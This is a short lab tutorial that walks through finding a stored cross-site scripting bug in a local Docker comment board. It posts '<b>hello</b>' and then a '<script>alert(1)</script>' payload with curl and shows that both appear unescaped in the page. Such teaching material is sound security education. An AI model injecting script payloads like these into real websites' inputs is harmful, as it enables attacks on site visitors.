# Finding the Bug

Start the lab and browse to the comment board:

```bash
docker compose up --build -d
curl http://localhost:8080/api/comments
```

Output:
```json
{"comments": [], "count": 0}
```

Post a comment with HTML:

```bash
curl -X POST http://localhost:8080/comment \
  -d "text=<b>hello</b>"
```

Fetch the page source:

```bash
curl -s http://localhost:8080/ | grep "hello"
```

Output:
```html
<div class='comment'><b>hello</b></div>
```

The `<b>` tag was not escaped. The server passed your HTML directly into the page. If the browser renders this, it displays bold text. That means a `<script>` tag would also execute.

Confirm by posting a script:

```bash
curl -X POST http://localhost:8080/comment \
  -d "text=<script>alert(1)</script>"
```

```bash
curl -s http://localhost:8080/ | grep "script"
```

Output:
```html
<div class='comment'><script>alert(1)</script></div>
```

The script is in the page. Any browser rendering this page would execute it.
